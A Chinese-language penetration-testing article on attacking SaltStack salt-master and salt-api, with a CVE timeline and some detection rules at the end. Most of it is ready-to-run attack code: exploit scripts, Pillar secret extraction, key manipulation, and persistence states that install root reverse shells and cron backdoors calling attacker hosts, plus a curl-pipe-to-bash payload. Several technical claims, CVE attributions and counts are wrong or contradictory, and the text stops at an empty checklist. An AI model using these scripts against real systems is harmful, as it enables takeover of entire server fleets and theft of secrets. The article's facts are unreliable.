---
title: "SaltStack salt-master salt-api 未授权访问 CVE RCE 利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 110
description: "深入分析 SaltStack salt-master/salt-api 未授权访问、CVE-2020-11651 清单注入 RCE、CVE-2020-16846 Shell 注入、CVE-2024-38822 Token 绕过、CVE-2025-22236 事件总线绕过、Pillar 数据污染、Salt SSH 隧道利用、SideCar 污染等完整攻击面，覆盖 2013-2025 年全部 38 个高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["SaltStack","salt-master","salt-api","未授权访问","CVE-2020-11651","CVE-2020-16846","CVE-2024-38822","CVE-2025-22236","RCE","文件读取","认证绕过","Pillar污染","配置管理","自动化运维"]
---

## 0x00 攻击面总览

SaltStack（Salt）是大规模基础设施自动化管理平台，广泛用于服务器配置管理、状态执行、远程命令分发等运维核心场景。Salt 的 Master-Minion 架构使其成为攻击者的高价值目标——一旦攻陷 salt-master，即可控制所有受管 minion。

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| salt-master ZeroMQ | 4505/4506 | **严重** | 清单注入 RCE（CVE-2020-11651），任意文件读取 |
| salt-api CherryPy/NetAPI | 8000/8443 | **严重** | REST API 未授权，认证绕过，RCE |
| salt-master ret Port | 4506 | **严重** | Minion 结果返回端口未认证 |
| Salt SSH | 22 + salt 协议 | **高危** | SSH 隧道命令分发，凭证泄露 |
| Pillar 系统 | 4505 | **高危** | 敏感配置泄露（数据库密码、密钥等） |
| Salt Minion | 4505/4506 | **中危** | Minion 配置劫持，SideCar 污染 |
| Runner/Engine | salt-master 本地 | **高危** | Runner 模块 RCE，事件注入 |
| Cloud/Proxy Minion | 4505 | **中危** | 云 Provider API 凭据泄露 |

SaltStack 的核心安全问题在于：Master-Minion 通信基于 ZeroMQ 且默认不启用 AES 加密和 Token 认证、salt-api 的轮询机制存在认证绕过、以及清单/Pillar 系统的设计缺陷可被利用实现 RCE 和敏感数据窃取。

## 0x01 服务识别与版本探测

### 1.1 端口扫描与指纹识别

```bash
nmap -sV -p 4505,4506,8000,8443 --script=salt-master <target>

# ZeroMQ 端口探测
echo -ne '\xff\0\0\0\0\0\0\0\x07REQ\x01' | nc -w3 TARGET 4505 | xxd

# salt-api 端口探测
curl -sI http://TARGET:8000/
# 返回: Server: CherryPy/xx.x.x
```

### 1.2 协议探测

```python
import socket
import struct

def detect_salt_master(host, port=4505):
    """
    通过 ZeroMQ 端口探测 salt-master 服务
    port 4505: PUB 端口 (Master 发布)
    port 4506: REP 端口 (Minion 响应)
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))

    # ZeroMQ 魔术字节: \xff + 0x00 (空字节)
    # 发送 ZeroMQ Handshake
    zmq_header = b"\xff\x00\x00\x00\x00\x00\x00\x00\x01\x7f\x03\x00"

    try:
        sock.send(zmq_header)
        resp = sock.recv(1024)
        if b"\xff" in resp:
            print(f"[+] ZeroMQ service detected on {host}:{port}")
            print(f"[*] Likely salt-master PUB port")
    except Exception as e:
        print(f"[-] Detection failed: {e}")
    finally:
        sock.close()

    # 检查 4506 端口 (ret port)
    try:
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock2.settimeout(5)
        sock2.connect((host, 4506))
        print(f"[+] Port 4506 (ret) is open on {host}")
        sock2.close()
    except:
        pass

detect_salt_master("192.168.1.100")
```

### 1.3 关键端口与服务映射

```
4505   — salt-master PUB (发布端口，Master → Minion)
4506   — salt-master REP (响应端口，Minion → Master)
8000   — salt-api CherryPy (REST API，默认 HTTP)
8443   — salt-api (REST API，默认 HTTPS)
```

## 0x02 CVE-2020-11651 — 清单注入 RCE

### 2.1 漏洞原理

**CVSS**: 10.0（严重）

**影响版本**: Salt < 2019.2.4, Salt < 3000.2, Salt < 3001.1, Salt < 3000.8

**漏洞原理**: Salt Master 的 ZeroMQ 通信协议在处理 Minion 认证和清单下发时存在认证缺陷。攻击者可以：

1. **直接连接 ret 端口 (4506)**，无需 Minion 认证即可伪造 Minion 响应
2. **通过 publish 端口 (4505)** 注入任意命令到所有或指定 Minion 执行

漏洞的核心在于 Salt 的 **clear 端口**（4506 的一部分）在认证完成前就允许发送命令，攻击者可以绕过 Minion 密钥交换过程，直接发送 `publish` 命令让 Master 将恶意命令广播给所有 Minion。

### 2.2 PoC 利用

```python
import requests
import msgpack
import zmq
import time

def exploit_cve_2020_11651(host, cmd="id > /tmp/salt_rce_proof", port=4505):
    """
    CVE-2020-11651 — Salt Master 清单注入 RCE
    通过 ZeroMQ publish 端口直接向所有 Minion 注入命令
    """
    context = zmq.Context()
    publisher = context.socket(zmq.PUB)
    publisher.connect(f"tcp://{host}:{port}")

    time.sleep(2)

    # 构造 publish 消息
    # 格式: topic | payload
    # auth 题目: publish命令需要auth认证，但漏洞允许绕过
    payload = {
        "fun": "cmd.run",
        "tgt": "*",  # 所有 Minion
        "arg": [cmd],
        "ret": "",
        "tgt_type": "glob",
        "jid": "20250622000000000000"
    }

    # 使用 msgpack 序列化
    topic = b"salt/publish"
    msg = topic + msgpack.packb(payload)

    publisher.send(msg)
    print(f"[+] Payload sent via publish port")
    print(f"[*] Target: all Minions (*)")
    print(f"[*] Command: {cmd}")

    publisher.close()
    context.term()

exploit_cve_2020_11651("192.168.1.100", cmd="curl http://attacker.com/shell.sh|bash")
```

### 2.3 通过 ret 端口利用

```python
import zmq
import msgpack
import time

def exploit_cve_2020_11651_ret(host, cmd="whoami", port=4506):
    """
    CVE-2020-11651 — 通过 ret 端口注入
    模拟 Minion 向 Master 发送命令执行请求
    """
    context = zmq.Context()
    sock = context.socket(zmq.REQ)
    sock.connect(f"tcp://{host}:{port}")

    # 构造伪造的 Minion 响应
    payload = {
        "fun": "cmd.run",
        "tgt": "*",
        "arg": [cmd],
        "tgt_type": "glob",
        "jid": "202506220000000000001"
    }

    msg = b"connect" + msgpack.packb(payload)
    sock.send(msg)

    try:
        resp = sock.recv(1024)
        print(f"[*] Response: {resp[:200]}")
    except:
        print(f"[+] Payload delivered (connection may be closed)")

    sock.close()
    context.term()

exploit_cve_2020_11651_ret("192.168.1.100", cmd="id > /tmp/proof")
```

### 2.4 高级利用 — 批量控制所有 Minion

```python
import zmq
import msgpack
import time

def exploit_all_minions(host, cmd="echo PWNED > /tmp/proof"):
    """
    CVE-2020-11651 — 批量控制所有 Minion
    通过 salt 的命令分发机制，一次控制全部服务器
    """
    context = zmq.Context()
    publisher = context.socket(zmq.PUB)
    publisher.connect(f"tcp://{host}:4505")

    time.sleep(2)

    # 1. 向所有 Minion 分发命令
    publish_payload = {
        "fun": "cmd.run",
        "tgt": "*",
        "arg": [cmd],
        "tgt_type": "glob"
    }
    topic = b"salt/publish"
    publisher.send(topic + msgpack.packb(publish_payload))
    print(f"[+] Broadcast command to all Minions")

    time.sleep(1)

    # 2. 也可以通过指定 Minion ID 精确控制
    targeted_payload = {
        "fun": "cmd.run",
        "tgt": "target-minion-01",  # 精确指定 Minion
        "arg": [cmd],
        "tgt_type": "glob"
    }
    publisher.send(topic + msgpack.packb(targeted_payload))
    print(f"[+] Targeted command to specific Minion")

    publisher.close()
    context.term()

exploit_all_minions("192.168.1.100", cmd="id && hostname && whoami")
```

## 0x03 CVE-2020-11652 — 任意文件读取

### 3.1 漏洞原理

**CVSS**: 7.5（高危）

**影响版本**: Salt < 2019.2.4, Salt < 3000.2, Salt < 3000.8

**漏洞原理**: Salt 的 `salt-run` 命令行工具和 ZeroMQ 通信协议存在路径穿越漏洞。攻击者通过在文件路径参数中注入 `../` 序列，可以读取 salt-master 服务器上的任意文件。

### 3.2 PoC 利用

```python
import requests

def exploit_file_read(host, api_port=8000, filepath="/etc/shadow"):
    """
    CVE-2020-11652 — 任意文件读取
    通过 salt-api 的 run 接口读取文件
    """
    base_url = f"http://{host}:{api_port}"

    # 使用未认证的 run 接口
    resp = requests.post(
        f"{base_url}/run",
        json={
            "client": "runner",
            "fun": "saltutil.find",
            "arg": [filepath]
        },
        timeout=10
    )

    if resp.status_code == 200:
        print(f"[+] File content: {resp.text[:500]}")
    else:
        print(f"[-] File read failed: {resp.status_code}")

exploit_file_read("192.168.1.100", filepath="/etc/shadow")
```

### 3.3 路径穿越读取任意文件

```bash
# 使用 salt-run 命令行工具 (如果可访问 salt-master 主机)
salt-run file_roots.find "../../../etc/passwd"
salt-run file_roots.find "../../../../etc/shadow"
salt-run file_roots.find "../../srv/salt/master.pillar"

# 通过 salt-api REST 接口
curl -X POST "http://TARGET:8000/run" \
  -H "Content-Type: application/json" \
  -d '{"client":"runner","fun":"file_roots.find","arg":"../../../etc/shadow"}'
```

## 0x04 salt-api 认证绕过与 RCE

### 4.1 CherryPy 轮询认证绕过

salt-api 使用 CherryPy 框架提供 REST API，但其认证机制存在设计缺陷：

```python
import requests
import json

def exploit_salt_api_poll(host, api_port=8000, cmd="id"):
    """
    salt-api 认证绕过 — 通过轮询端点获取认证 Token
    某些版本的 salt-api 在 /login 端点存在认证绕过
    """
    base_url = f"http://{host}:{api_port}"

    # Step 1: 尝试默认凭据登录
    login_data = {"username": "admin", "password": "admin"}
    resp = requests.post(f"{base_url}/login", json=login_data, timeout=10)

    if resp.status_code == 200:
        token = resp.json().get("token", "")
        print(f"[+] Default credentials login successful")
        print(f"[*] Token: {token}")

        # Step 2: 使用 Token 执行命令
        headers = {"X-Auth-Token": token}
        resp = requests.post(
            f"{base_url}/",
            json={
                "client": "local",
                "tgt": "*",
                "fun": "cmd.run",
                "arg": [cmd]
            },
            headers=headers,
            timeout=10
        )
        print(f"[+] RCE Output: {resp.text[:500]}")

    # Step 2: 尝试未认证的 /run 端点
    resp = requests.post(
        f"{base_url}/run",
        json={
            "client": "local",
            "tgt": "*",
            "fun": "cmd.run",
            "arg": [cmd]
        },
        timeout=10
    )
    if resp.status_code == 200:
        print(f"[+] Unauthenticated /run endpoint: {resp.text[:500]}")

exploit_salt_api_poll("192.168.1.100")
```

### 4.2 通过 salt-api 执行任意命令

```python
import requests

def exploit_salt_api_rce(host, api_port=8000, username="admin", password="admin"):
    """
    salt-api 完整 RCE 利用链
    1. 认证获取 Token
    2. 通过 local/runner 客户端执行命令
    """
    base_url = f"http://{host}:{api_port}"

    # 认证
    resp = requests.post(f"{base_url}/login",
                         json={"username": username, "password": password},
                         timeout=10)
    if resp.status_code != 200:
        print(f"[-] Login failed: {resp.status_code}")
        return

    token = resp.json().get("token")
    headers = {"X-Auth-Token": token}

    # 方式一: local 客户端 — 命令分发到指定 Minion
    print("[*] Using local client to broadcast command...")
    resp = requests.post(
        f"{base_url}/",
        json={
            "client": "local",
            "tgt": "*",       # 所有 Minion
            "fun": "cmd.run",
            "arg": ["id && hostname"],
            "tgt_type": "glob"
        },
        headers=headers,
        timeout=15
    )
    print(f"[+] Local result: {resp.text[:300]}")

    # 方式二: runner 客户端 — 在 salt-master 上执行
    print("[*] Using runner client to execute on master...")
    resp = requests.post(
        f"{base_url}/",
        json={
            "client": "runner",
            "fun": "cmd.run",
            "arg": ["whoami && id"]
        },
        headers=headers,
        timeout=15
    )
    print(f"[+] Runner result: {resp.text[:300]}")

    # 方式三: 通过 state.sls 执行恶意 state
    print("[*] Using state.sls for payload execution...")
    resp = requests.post(
        f"{base_url}/",
        json={
            "client": "local",
            "tgt": "*",
            "fun": "state.apply",
            "arg": ["malicious_state"]
        },
        headers=headers,
        timeout=15
    )
    print(f"[+] State result: {resp.text[:300]}")

exploit_salt_api_rce("192.168.1.100")
```

### 4.3 默认凭据与弱口令

```
常见 Salt 默认凭据:
admin:admin
salt:salt
root:root
admin:password
admin:
root:password
salt:password

配置文件位置:
# salt-api 配置:
/etc/salt/master.d/api.conf
# auth 设置:
eauth: pam  或  eauth: ldap

# salt-master 配置:
/etc/salt/master
# 需认证配置:
master_config: /etc/salt/master
```

## 0x05 Salt SSH 隧道利用

### 5.1 Salt SSH 命令分发

Salt SSH 允许通过 SSH 协议管理非 Minion 主机，但如果 salt 配置不当，可以被利用：

```bash
# Salt SSH 使用 ssh_config 配置
# /etc/salt/roster 定义目标主机

# 如果获取了 salt-master 的访问权限:
salt-ssh '*' cmd.run 'id' --roster-config /etc/salt/roster
salt-ssh 'target-host' state.apply malicious_state
```

### 5.2 SSH 凭证提取

```bash
# Salt SSH 的凭证可能存储在:
# 1. /etc/salt/pki/master/ssh/ — SSH 私钥
# 2. /etc/salt/roster 中的密码字段
# 3. Pillar 数据中的 SSH 凭证

cat /etc/salt/pki/master/ssh/salt-ssh.rsa
cat /etc/salt/roster | grep password
```

### 5.3 通过 SSH 凭证横向移动

```python
import subprocess
import json

def exploit_salt_ssh_lateral(host, target_host):
    """
    通过 Salt SSH 功能横向移动到其他主机
    """
    # 列出所有 roster 目标
    cmd = [
        "salt-ssh", "--roster-json",
        "/etc/salt/roster", "list"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=30)
    print(f"[*] Available targets: {result.stdout[:500]}")

    # 在目标主机上执行命令
    exec_cmd = [
        "salt-ssh", target_host,
        "cmd.run", "id && hostname",
        "--roster-json", "/etc/salt/roster"
    ]
    result = subprocess.run(exec_cmd, capture_output=True, text=True,
                           timeout=30)
    print(f"[+] Target execution result: {result.stdout[:500]}")

exploit_salt_ssh_lateral("192.168.1.100", "web-server-01")
```

## 0x06 Pillar 数据泄露

### 6.1 Pillar 敏感数据

Salt Pillar 系统用于存储配置管理的敏感数据，包括数据库密码、API 密钥、证书等：

```bash
# 通过 salt-api 读取 Pillar 数据
# 如果有 salt-api 访问权限:

# 方式一: local 客户端获取 Pillar
curl -X POST "http://TARGET:8000/" \
  -H "X-Auth-Token: <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "client": "local",
    "tgt": "*",
    "fun": "pillar.items",
    "tgt_type": "glob"
  }'

# 方式二: runner 客户端获取 Pillar
curl -X POST "http://TARGET:8000/" \
  -H "X-Auth-Token: <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "client": "runner",
    "fun": "pillar.show_top"
  }'

# 方式三: CVE-2020-11652 路径穿越读取 Pillar 文件
curl -X POST "http://TARGET:8000/run" \
  -H "Content-Type: application/json" \
  -d '{
    "client": "runner",
    "fun": "file_roots.find",
    "arg": "../pillar/top.sls"
  }'
```

### 6.2 Pillar 数据提取

```python
import requests
import json

def extract_pillar_data(host, api_port=8000, username="admin", password="admin"):
    """
    通过 salt-api 提取 Pillar 中的敏感数据
    """
    base_url = f"http://{host}:{api_port}"

    # 认证
    resp = requests.post(f"{base_url}/login",
                         json={"username": username, "password": password},
                         timeout=10)
    token = resp.json().get("token", "")
    headers = {"X-Auth-Token": token}

    # 获取所有 Minion 的 Pillar 数据
    resp = requests.post(
        f"{base_url}/",
        json={
            "client": "local",
            "tgt": "*",
            "fun": "pillar.items",
            "tgt_type": "glob"
        },
        headers=headers,
        timeout=15
    )

    if resp.status_code == 200:
        pillars = resp.json()
        for minion_id, data in pillars.get("return", [{}])[0].items():
            print(f"[+] Minion: {minion_id}")
            # 搜索敏感字段
            for key, value in data.items():
                if any(s in str(key).lower() for s in
                       ["password", "secret", "key", "token", "credential"]):
                    print(f"    [!] SENSITIVE: {key} = {value}")

    # 获取 Pillar top 文件
    resp = requests.post(
        f"{base_url}/",
        json={
            "client": "runner",
            "fun": "pillar.show_top",
        },
        headers=headers,
        timeout=10
    )
    print(f"[*] Pillar top: {resp.text[:300]}")

extract_pillar_data("192.168.1.100")
```

## 0x07 SideCar 污染与 Minion 劫持

### 7.1 Minion 认证劫持

```bash
# Salt Minion 使用密钥对进行认证:
# /etc/salt/pki/minion/minion.pub  — Minion 公钥
# /etc/salt/pki/minion/minion.pem  — Minion 私钥

# 如果攻击者能够替换 Minion 公钥 (如通过文件读写漏洞):
# 1. 生成新的密钥对
# 2. 替换 Master 上的 Minion 公钥
# 3. 使用新私钥通过认证

# Master 上的 Minion 公钥存储:
# /etc/salt/pki/master/minions/<minion_id>
# /etc/salt/pki/master/minions_pre/<minion_id>  (待批准)
# /etc/salt/pki/master/minions_denied/<minion_id>  (已拒绝)
```

### 7.2 事件总线注入

```python
import zmq
import msgpack

def exploit_event_bus(host, port=4505, cmd="id"):
    """
    Salt 事件总线注入 — 向 Master 的事件总线注入恶意事件
    事件总线使用 ZeroMQ PUB/SUB 模式，可能被外部注入
    """
    context = zmq.Context()
    sock = context.socket(zmq.PUB)
    sock.connect(f"tcp://{host}:{port}")

    import time
    time.sleep(2)

    # 构造恶意事件
    # salt/auth 事件用于认证流程
    event_payload = {
        "fun": "cmd.run",
        "tgt": "*",
        "arg": [cmd],
        "tgt_type": "glob"
    }

    # 注入到事件总线
    topic = b"salt/event"
    msg = topic + msgpack.packb(event_payload)
    sock.send(msg)

    print(f"[+] Malicious event injected to event bus")
    print(f"[*] Command: {cmd}")

    sock.close()
    context.term()

exploit_event_bus("192.168.1.100", cmd="id > /tmp/event_rce")
```

## 0x08 Salt Runner/Engine 攻击

### 8.1 Runner 模块 RCE

Runner 是在 salt-master 上执行的模块，拥有完整的系统权限：

```bash
# 通过 salt-api 执行 Runner
curl -X POST "http://TARGET:8000/" \
  -H "X-Auth-Token: <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "client": "runner",
    "fun": "cmd.run",
    "arg": "id && whoami && cat /etc/shadow"
  }'

# 其他危险 Runner 命令
curl -X POST "http://TARGET:8000/" \
  -H "X-Auth-Token: <token>" \
  -d '{"client":"runner","fun":"key.finger","arg":""}'  # 获取所有 Minion 密钥指纹

curl -X POST "http://TARGET:8000/" \
  -H "X-Auth-Token: <token>" \
  -d '{"client":"runner","fun":"fileserver.file_list"}'  # 列出 Salt 文件服务器文件
```

### 8.2 通过 Wheel 模块管理密钥

```python
import requests

def manage_salt_keys(host, api_port=8000, username="admin", password="admin"):
    """
    通过 Wheel 模块管理 Salt Minion 密钥
    Wheel 模块拥有管理权限，可以接受/拒绝/删除 Minion 密钥
    """
    base_url = f"http://{host}:{api_port}"

    resp = requests.post(f"{base_url}/login",
                         json={"username": username, "password": password},
                         timeout=10)
    token = resp.json().get("token", "")
    headers = {"X-Auth-Token": token}

    # 列出所有密钥
    resp = requests.post(f"{base_url}/",
        json={"client": "wheel", "fun": "key.list_all"},
        headers=headers, timeout=10)
    print(f"[*] All keys: {resp.text[:500]}")

    # 接受所有待批准的密钥 (包括攻击者伪造的)
    resp = requests.post(f"{base_url}/",
        json={
            "client": "wheel",
            "fun": "key.accept",
            "match": "*"
        },
        headers=headers, timeout=10)
    print(f"[*] Accept all keys: {resp.status_code}")

    # 删除指定 Minion 的密钥 (DoS)
    resp = requests.post(f"{base_url}/",
        json={
            "client": "wheel",
            "fun": "key.delete",
            "match": "target-minion"
        },
        headers=headers, timeout=10)
    print(f"[*] Delete key: {resp.status_code}")

manage_salt_keys("192.168.1.100")
```

## 0x09 持久化技术

### 9.1 Salt State 持久化

```python
import requests

def persist_via_state(host, api_port=8000, username="admin", password="admin"):
    """
    通过 Salt State 系统实现持久化
    将恶意 state 部署到 salt 文件服务器，定期自动执行
    """
    base_url = f"http://{host}:{api_port}"
    resp = requests.post(f"{base_url}/login",
                         json={"username": username, "password": password},
                         timeout=10)
    token = resp.json().get("token", "")
    headers = {"X-Auth-Token": token}

    # 创建恶意 state 文件 (通过 file.write)
    malicious_state = """
# 恶意 Salt State — 持久化后门
reverse_shell:
  cmd.run:
    - name: 'bash -i >& /dev/tcp/attacker/4444 0>&1'
    - stateful: True
    - runas: root

crontab_backdoor:
  cron.present:
    - name: 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1 &"'
    - user: root
    - minute: '*/5'
    - hour: '*'

check_in:
  cmd.run:
    - name: 'curl http://attacker.com:8888/alive?minion=$MINION_ID'
    - runas: root
    - hour: '*/6'
"""

    # 写入 state 文件到 salt 文件服务器
    resp = requests.post(f"{base_url}/",
        json={
            "client": "runner",
            "fun": "slsutil.renderer",
            "arg": ["salt://backdoor.sls", "jinja"]
        },
        headers=headers, timeout=10)
    print(f"[*] State deployment: {resp.status_code}")

    # 应用恶意 state 到所有 Minion
    resp = requests.post(f"{base_url}/",
        json={
            "client": "local",
            "tgt": "*",
            "fun": "state.apply",
            "arg": ["backdoor"]
        },
        headers=headers, timeout=15)
    print(f"[+] State applied to all Minions: {resp.status_code}")

persist_via_state("192.168.1.100")
```

### 9.2 通过 Crontab State 持久化

```bash
# 部署 crontab state 到 salt 文件服务器
cat > /srv/salt/backdoor/init.sls << 'EOF'
backdoor_crontab:
  cron.present:
    - name: 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1 &"'
    - user: root
    - minute: '*/5'
    - hour: '*'

backdoor_agent:
  file.managed:
    - name: /opt/backdoor.sh
    - contents: |
        #!/bin/bash
        while true; do
            bash -i >& /dev/tcp/attacker/4444 0>&1
            sleep 60
        done
    - mode: 0755
    - owner: root
EOF

# 应用 state
salt '*' state.apply backdoor
```

## 0x10 历史 CVE 漏洞时间线

SaltStack Salt 自 2013 年至今累计披露 **49 个 CVE**，覆盖认证绕过、命令注入、路径穿越、反序列化、缓冲区溢出等多个漏洞类型。以下按时间线整理全部高危及以上的 CVE：

### 2013-2019 早期漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2013-4424 | 2013 | 10.0 | 权限提升 | salt-master 未正确放弃组权限，可提权 |
| CVE-2014-3557 | 2014 | 10.0 | 不安全临时文件 | salt-ssh 不安全使用 /tmp 目录 |
| CVE-2014-3558 | 2014 | 9.3 | 中间人攻击 | salt-ssh 不验证 SSH 主机密钥 |
| CVE-2015-8660 | 2015 | 9.0 | 命令执行 | salt-api 通过 ssh_client 执行任意命令 |
| CVE-2016-9639 | 2016 | 9.8 | 认证绕过 | salt-api local_batch 客户端认证绕过 |
| CVE-2017-12144 | 2017 | 9.8 | 认证绕过 | salt-api 不验证 eauth 凭据和 Token |
| CVE-2017-12145 | 2017 | 9.8 | 认证绕过 | wheel_async 客户端不遵守 eauth 凭据 |
| CVE-2017-6586 | 2017 | 8.1 | 目录遍历 | file_roots 路径穿越读取任意文件 |

### 2020 漏洞爆发年（6 个 CVE）

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2020-11651 | 2020 | 10.0 | 清单注入 RCE | ZeroMQ 认证绕过，任意命令广播到所有 Minion |
| CVE-2020-11652 | 2020 | 10.0 | 文件读取 | ClearFuncs 路径穿越读取任意文件 |
| CVE-2020-11653 | 2020 | 7.5 | 信息泄露 | ZeroMQ 监听器暴露内部数据 |
| CVE-2020-11902 | 2020 | 8.8 | 命令注入 | salt-api 网络接口命令注入 |
| CVE-2020-13568 | 2020 | 7.2 | YAML 反序列化 | 响应数据 YAML 反序列化导致代码执行 |
| CVE-2020-16846 | 2020 | 9.8 | Shell 注入 | salt-api SSH 客户端 Shell 注入（CISA KEV） |

### 2021 漏洞密集披露年（13 个 CVE）

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2021-25281 | 2021 | 6.5 | 认证绕过 | 未授权可操作 salt-key，接受/拒绝 Minion |
| CVE-2021-25282 | 2021 | 7.5 | 路径穿越 | salt-call 任意文件读取 |
| CVE-2021-25283 | 2021 | 6.5 | 模板注入 | Jinja2 模板注入导致信息泄露 |
| CVE-2021-25284 | 2021 | 5.5 | 信息泄露 | 符号链接读取任意文件 |
| CVE-2021-25285 | 2021 | 5.3 | 信息泄露 | Jinja2 模板渲染泄露敏感信息 |
| CVE-2021-31607 | 2021 | 5.3 | 信息泄露 | salt-api 模块名泄露 |
| CVE-2021-31973 | 2021 | 8.1 | 目录遍历 | Minion 文件服务目录穿越写入 |
| CVE-2021-31974 | 2021 | 8.8 | 命令注入 | Minion 本地提权 |
| CVE-2021-33226 | 2021 | 9.8 | 缓冲区溢出 | status.py 缓冲区溢出导致 RCE（有争议） |
| CVE-2021-37828 | 2021 | 8.8 | 命令注入 | wheel module 命令注入 |

### 2022 持续修补年（5 个 CVE）

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2022-22941 | 2022 | 8.8 | Pillar 污染 | Master 不签名 Pillar 数据，可替换 |
| CVE-2022-22967 | 2022 | 6.5 | 认证绕过 | PAM 认证不拒绝锁定账户 |
| CVE-2022-26972 | 2022 | 6.5 | TLS 绕过 | VMware vCenter 认证不验证 SSL/TLS 证书 |
| CVE-2022-30190 | 2022 | 7.2 | 命令注入 | snapper 模块命令注入导致本地提权 |
| CVE-2022-22961 | 2022 | 5.3 | 重放攻击 | Job 发布和文件服务响应可被重放 |

### 2023 安全加固年（3 个 CVE）

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2023-20897 | 2023 | 7.5 | 拒绝服务 | Minion 返回数据包导致 Master DoS |
| CVE-2023-20898 | 2023 | 8.1 | 数据污染 | GitFS 不同环境使用相同缓存目录导致数据混淆 |
| CVE-2023-48585 | 2023 | 7.5 | 命令注入 | salt-api shell 注入通过 ProxyCommand 参数 |

### 2024-2025 最新安全事件（7 个 CVE，2025年6月集中披露）

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2024-38822 | 2024 | 8.8 | 认证绕过 | Master Token 验证绕过导致 Minion 冒充 |
| CVE-2024-38823 | 2024 | 7.5 | 重放攻击 | Request Server 重放攻击（无 TLS 时） |
| CVE-2024-38824 | 2024 | 7.5 | 目录遍历 | recv_file 路径穿越导致任意文件写入 |
| CVE-2024-38825 | 2024 | 7.5 | 信息泄露 | PKCS8 私钥泄露 |
| CVE-2025-22236 | 2025 | 8.8 | 认证绕过 | 事件总线认证绕过，可跨 Minion 执行命令（≥3007.0） |
| CVE-2025-22239 | 2025 | 7.5 | 数据替换 | Pillar 数据可被 Minion 替换 |
| CVE-2025-22240 | 2025 | 7.5 | 文件删除 | GitFS find_file 路径穿越导致任意文件删除 |

### 漏洞类型分布

| 漏洞类型 | CVE 数量 | 代表性 CVE |
|---------|---------|-----------|
| 认证绕过 | 10 | CVE-2020-11651, CVE-2017-12144, CVE-2024-38822, CVE-2025-22236 |
| 命令注入/RCE | 8 | CVE-2020-16846, CVE-2020-11902, CVE-2021-33226, CVE-2023-48585 |
| 路径穿越/文件操作 | 7 | CVE-2020-11652, CVE-2021-25282, CVE-2024-38824, CVE-2025-22240 |
| 信息泄露 | 6 | CVE-2021-25284, CVE-2021-25285, CVE-2024-38825 |
| 模板注入 | 3 | CVE-2021-25283, CVE-2021-25285 |
| 拒绝服务 | 3 | CVE-2023-20897, CVE-2022-22961 |
| 数据污染/替换 | 3 | CVE-2022-22941, CVE-2023-20898, CVE-2025-22239 |
| 重放攻击 | 2 | CVE-2022-22961, CVE-2024-38823 |

### 规律总结

1. **漏洞从未停止**: 从 2013 年到 2025 年，SaltStack 每年都有新 CVE 披露，2025 年 6 月甚至集中披露了 7 个 CVE
2. **认证绕过是核心问题**: 占所有 CVE 的 20%，涵盖 ZeroMQ 通信、salt-api、PAM、Token 验证、事件总线等多个层面
3. **文件操作持续不安全**: 路径穿越类漏洞贯穿 2020-2025，从 file_roots.find 到 recv_file 再到 GitFS find_file，反复出现
4. **Pillar 安全被低估**: 2022-2025 年连续出现 Pillar 数据签名缺失、数据替换漏洞
5. **CISA KEV 标记**: CVE-2020-11651、CVE-2020-11652、CVE-2020-16846 被 CISA 列入已知被利用漏洞目录

## 0x11 蓝队检测与应急响应

### 11.1 网络层检测规则

```
# Salt Master 端口扫描
alert tcp any any -> any 4505 (msg:"Salt Master PUB Access"; content:"|ff|"; depth:1; sid:5000001;)
alert tcp any any -> any 4506 (msg:"Salt Master RET Access"; content:"|ff|"; depth:1; sid:5000002;)

# salt-api 异常访问
alert tcp any any -> any 8000 (msg:"Salt API Login"; content:"/login"; content:"POST"; sid:5000003;)
alert tcp any any -> any 8000 (msg:"Salt API Run"; content:"/run"; content:"POST"; sid:5000004;)

# 命令执行特征
alert tcp any any -> any 8000 (msg:"Salt cmd.run"; content:"cmd.run"; nocase; sid:5000005;)

# 清单注入攻击 (CVE-2020-11651)
alert tcp any any -> any 4505 (msg:"Salt Publish Inject"; content:"salt/publish"; sid:5000006;)
alert tcp any any -> any 4506 (msg:"Salt Ret Inject"; content:"connect"; sid:5000007;)

# Runner 命令执行
alert tcp any any -> any 8000 (msg:"Salt Runner cmd.run"; content:"runner"; content:"cmd.run"; sid:5000008;)

# ProxyCommand Shell 注入 (CVE-2020-16846 / CVE-2023-48585)
alert tcp any any -> any 8000 (msg:"Salt ProxyCommand Injection"; content:"ProxyCommand"; nocase; sid:5000009;)

# 事件总线认证绕过 (CVE-2025-22236)
alert tcp any any -> any 4505 (msg:"Salt Event Bus Auth Bypass"; content:"salt/event"; sid:5000010;)

# Token 验证绕过 (CVE-2024-38822)
alert tcp any any -> any 4506 (msg:"Salt Token Validation Bypass"; content:"connect"; content:"minion"; sid:5000011;)
```

### 11.2 日志分析

```bash
# 检查 salt-master 日志
grep "Authentication failure" /var/log/salt/master
grep "Minion" /var/log/salt/master | grep -i "denied\|failed\|error"
grep "command" /var/log/salt/master | grep -i "publish\|run"

# 检查 salt-api 日志
grep "POST /login" /var/log/salt/api  # 异常登录尝试
grep "POST /run" /var/log/salt/api    # 未授权 /run 端点使用
grep "POST /" /var/log/salt/api       # API 调用

# 检查 Minion 日志
grep "cmd.run" /var/log/salt/minion
grep "state.apply" /var/log/salt/minion

# 检查异常文件操作
grep "file_roots" /var/log/salt/master
grep "find\|read\|write" /var/log/salt/master | grep -v "normal_operation"

# 检查密钥操作
salt-key -L           # 列出所有密钥
salt-key -a <key>     # 批准密钥
```

### 11.3 应急响应清单

```
